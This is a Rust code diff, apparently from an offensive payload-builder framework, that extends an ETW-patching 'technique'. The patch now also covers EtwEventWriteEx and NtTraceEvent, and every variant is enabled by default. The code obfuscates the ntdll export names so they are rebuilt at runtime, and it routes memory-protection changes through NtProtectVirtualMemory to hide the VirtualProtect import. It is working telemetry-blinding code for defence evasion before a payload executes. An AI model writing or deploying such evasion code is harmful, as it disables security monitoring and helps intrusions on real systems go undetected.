@@ -1,9 +1,9 @@
 //! ETW patch.
 //!
-//! Patches `EtwEventWrite` (and, optionally, `EtwEventWriteFull`) in the current
-//! process so ETW providers stop emitting events. A Preparation technique: it
-//! modifies the process state and never runs the payload. See `README.md` for
-//! the full write-up.
+//! Patches `EtwEventWrite` (and, optionally, `EtwEventWriteFull`,
+//! `EtwEventWriteEx` and `NtTraceEvent`) in the current process so ETW providers
+//! stop emitting events. A Preparation technique: it modifies the process state
+//! and never runs the payload. See `README.md` for the full write-up.
 
 use serde::{Deserialize, Serialize};
 
@@ -17,20 +17,37 @@ pub struct Params {
     /// Also patch `EtwEventWriteFull`, the variant that most script and .NET
     /// telemetry actually calls. Best effort: if the export cannot be patched,
     /// the main patch still stands.
-    #[serde(default = "default_full")]
+    #[serde(default = "default_true")]
     pub full: bool,
+
+    /// Also patch `EtwEventWriteEx`, the extended write variant. Best effort,
+    /// like [`Params::full`].
+    #[serde(default = "default_true")]
+    pub ex: bool,
+
+    /// Also patch `NtTraceEvent`, the native export the user-mode event writers
+    /// hand their events to on the way into the kernel. Best effort, and the
+    /// widest single cut: it also catches providers that bypass the `Etw*`
+    /// wrappers.
+    #[serde(default = "default_true")]
+    pub nt_trace: bool,
 }
 
-/// Default for [`Params::full`]: patch the Full variant too.
-pub fn default_full() -> bool {
+/// Default for the optional patch flags: cover every variant.
+///
+/// Each patch is best effort, so on-by-default costs nothing when a build does
+/// not export the variant.
+pub fn default_true() -> bool {
     true
 }
 
 impl Default for Params {
-    /// Defaults to also patching `EtwEventWriteFull` (see [`default_full`]).
+    /// Defaults to patching every variant (see [`default_true`]).
     fn default() -> Self {
         Self {
-            full: default_full(),
+            full: default_true(),
+            ex: default_true(),
+            nt_trace: default_true(),
         }
     }
 }
@@ -48,7 +65,7 @@ pub const DEF: TechniqueDef = TechniqueDef {
     stub_fragment: include_str!("stub_fragment.rs"),
     formats: &[],
     requires_indirect_syscalls: false,
-    params_example: "technique: patch_etw\nparams:\n  full: true\n",
+    params_example: "technique: patch_etw\nparams:\n  full: true\n  ex: true\n  nt_trace: true\n",
     // The page protection changes go through the syscall layer, so
     // `mode: indirect` removes the `VirtualProtect` import.
     syscalls: &["NtProtectVirtualMemory"],
@@ -56,10 +73,9 @@ pub const DEF: TechniqueDef = TechniqueDef {
 };
 
 impl Params {
-    /// Renders the ETW-patch stub fragment, obfuscating the `ntdll.dll`,
-    /// `EtwEventWrite` and `EtwEventWriteFull` literals through `strings` so
-    /// they are rebuilt at runtime, and baking in whether the Full variant is
-    /// patched too.
+    /// Renders the ETW-patch stub fragment, obfuscating the `ntdll.dll` and
+    /// every event-writing export name through `strings` so they are rebuilt at
+    /// runtime, and baking in which optional variants are patched too.
     pub fn render_fragment(&self, strings: &StringsConfig) -> String {
         let etw_dll = strings.obfuscate("ntdll.dll").render_stub_expr("etw_dll");
         let etw_func = strings
@@ -68,11 +84,24 @@ impl Params {
         let etw_full_func = strings
             .obfuscate("EtwEventWriteFull")
             .render_stub_expr("etw_full_func");
+        let etw_ex_func = strings
+            .obfuscate("EtwEventWriteEx")
+            .render_stub_expr("etw_ex_func");
+        let etw_nt_trace_func = strings
+            .obfuscate("NtTraceEvent")
+            .render_stub_expr("etw_nt_trace_func");
         DEF.stub_fragment
             .replace("$ETW_DLL_DEF$", &etw_dll)
             .replace("$ETW_FUNC_DEF$", &etw_func)
             .replace("$ETW_FULL_FUNC_DEF$", &etw_full_func)
+            .replace("$ETW_EX_FUNC_DEF$", &etw_ex_func)
+            .replace("$ETW_NT_TRACE_FUNC_DEF$", &etw_nt_trace_func)
             .replace("$PATCH_FULL$", if self.full { "true" } else { "false" })
+            .replace("$PATCH_EX$", if self.ex { "true" } else { "false" })
+            .replace(
+                "$PATCH_NT_TRACE$",
+                if self.nt_trace { "true" } else { "false" },
+            )
     }
 }
 
